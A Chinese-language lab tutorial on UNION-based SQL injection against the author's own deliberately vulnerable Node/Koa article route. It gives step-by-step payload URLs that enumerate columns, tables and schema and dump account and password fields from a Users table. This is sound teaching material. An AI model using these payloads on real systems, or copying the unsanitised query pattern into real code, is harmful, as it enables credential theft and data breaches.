## 计算机病毒与入侵关于SQL注入的研究（二）
### 写在前面
上一次我们尝试了越过用户登录权限，这一次我们再来尝试：**通过union拖库**
> union大法吼

### SQL注入前准备
- 生成测试需要的数据库和表
编写models/Article和models/migrate.js，然后运行node models/migrate重置数据库，生成如下图所示的Articles表：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second1.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 

- 编写路由代码：
```javascript
router.get("/article",function *(){
    var ctx = this;
    var query = ctx.request.query;
    var articleId = query.id || 1;
    debug("SQL",`select * from Articles where id = ${articleId}`);
    var data = yield db.query(`select * from Articles where id = ${articleId}`,{
        type: db.QueryTypes.SELECT
    });
    data = data.length !== 0 ? data[data.length - 1] : {
        title : "没有这个文章",
        content :"<p>没有这个文章</p>"
    };
    // debug(data);
    yield ctx.render("index.html", data);
})
```
上面是一个路由函数。简单的说就是处理GET参数id，然后使用SQL对id进行查询，得到数据渲染html返回给浏览器端。对应路由是```http://localhost:3030/article?id=1```运行起来如下图：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second2.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 

- 编写css和gulpfile.js自动化脚本等
引入browsersync和gulp自动脚本，与注入无关，略过

### SQL注入测试
首先测试 ```http://localhost:3030/article？id=3/*ABC*/```。可以发现返回的页面没有变化，说明对输入没有过滤，这里是可以注入的。现在我们使用自己写的union进行邪恶地拖库（注：造成空格有两种：一种直接加空格Encode之后就是  ，一种使用/\*\*/注释来分隔，下面我们空格方便查看）
- 第一步，测试SQL注入语句，访问```http://localhost:3030/article?id=3 and 1=2```
可以发现页面显示没有文章，因为1=2永远为false，所以返回的是没有文章。
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second3.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 

- 第二步，union链接得到当前文章所在表的字段个数，从1开始测
```
http://localhost:3030/article?id=3 and 1=1 union select 1
http://localhost:3030/article?id=3 and 1=1 union select 1,2  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5  
```
前四步执行的时候都显示：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second4.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
因为union两头连接的表的字段数不一样，所以后台处理会发生错误，总之返回肯定会不正常，有的可能还会显示DEBUG信息= - =
最后第五步成功，我们放到mysql里面执行就是如下结果：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second5.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
这个时候我们发现页面会发现展示的还是id=3的文章，返回信息没有变化，为什么呢?
我们看路由处理里面的代码，会发现取得数据是数组的第一个：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second6.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
所以碰到这种情况我们只要加一个order by id DESC就可以了：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,2,3,4,5 order by id DESC  
```
这个时候我们sql的执行结果是：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second7.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
页面的返回结果是：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second8.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
！！！我们可以看到我们输入的2，3分别在这里被展示在了页面上，开心O(∩_∩)O哈哈~，这说明我们只要将2,3改成我们想要的信息就可以随意查看，好的，下面我们来进行第三步

- 第三步，得到数据库的信息：
将URL改成：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,version(),database(),4,5 order by id DESC  
```
通过mysql内置的函数看到了数据库的版本，数据表的名称：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second9.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
这很棒哦。现在我们要记住virustest这个数据库的名称，在下面有用处

- 第四步，得到这个数据库里面所有的表的名称：
将URL改成：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,2,TABLE_NAME,4,5 FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=virustest order by rand() DESC  
```
order by rand()是为了能够查看到所有的表名，我们多执行几次，就可以看到有一个Users表：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second10.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
这个表就有意思了，我们来继续注入，尝试着拿到用户名和密码

- 第五步，拖出数据库内Users表的表段名称
将URL改成：
```
http://localhost:3030/article?id=3 and 1=1 union SELECT 10000,COLUMN_NAME,3,4,5 FROM information_schema.columns where TABLE_SCHEMA='virustest' and TABLE_NAME='Users' order by rand()
```
不断运行，由于order by rand()所以可以陆续看到所有的列名，我们可以看到有两个我们比较感兴趣：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second11.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second12.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
记下account和password字段名称，我们开始拖出数据

- 第六步，拖出数据库内的数据
将URL改成
```
http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 from Users order by rand() DESC
```
结果：
<div align="center">
<img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second13.png" width = "500" height = "auto" alt="图片名称" align=center />
</div> 
不断F5刷新，就可以看到所有的account和password

### 简单的注入分析
以上所有的注入过程都是对普通SQL语言的利用。开发一个项目的时经常用到类似于id=?或者title=?这样的GET参数查询，不只是页面展示，在Restful API的时代，无论是前端web，还是手机app，与后端通信也很有可能会有很多这样的漏洞。很普遍的注入模式，造成的后果往往是灾难性的。